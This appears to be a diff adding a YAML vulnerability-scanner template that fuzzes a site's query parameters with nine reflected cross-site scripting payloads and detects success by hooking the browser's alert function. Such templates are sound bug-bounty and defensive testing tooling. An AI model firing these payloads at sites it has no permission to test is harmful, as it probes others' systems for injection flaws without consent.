@@ -1,0 +1,58 @@
+id: bugbounty-xss
+
+info:
+  name: XSS via Params (Headless, Alert Hook)
+  author: Justin Washek
+  severity: high
+  tags: xss,headless,fuzzing,alert
+
+headless:
+  - steps:
+      - action: script
+        name: hook_alert
+        args:
+          code: |
+            () => {
+              window.alert_value = null;
+              window.alert = function(msg) {
+                window.alert_value = msg;
+              };
+            }
+
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitload
+
+      - action: script
+        name: alertlog
+        args:
+          code: |
+            () => window.alert_value
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "'\"><script>alert('{{randstr_1}}')</script>"
+          - "\"><img src=x onerror=alert('{{randstr_1}}')>"
+          - "</script><script>alert('{{randstr_1}}')</script>"
+          - "'-alert('{{randstr_1}}')-'"
+          - "\"><svg/onload=alert('{{randstr_1}}')>"
+          - "<script>alert('{{randstr_1}}')</script>"
+          - "'><script>alert('{{randstr_1}}')</script>"
+          - "javascript:alert('{{randstr_1}}')//"
+          - "</title><img src=x onerror=alert('{{randstr_1}}')>"
+
+    matchers:
+      - type: word
+        part: alertlog
+        words:
+          - "{{randstr_1}}"
+
+    extractors:
+      - type: kval
+        part: alertlog
+        kval:
+          - alertlog
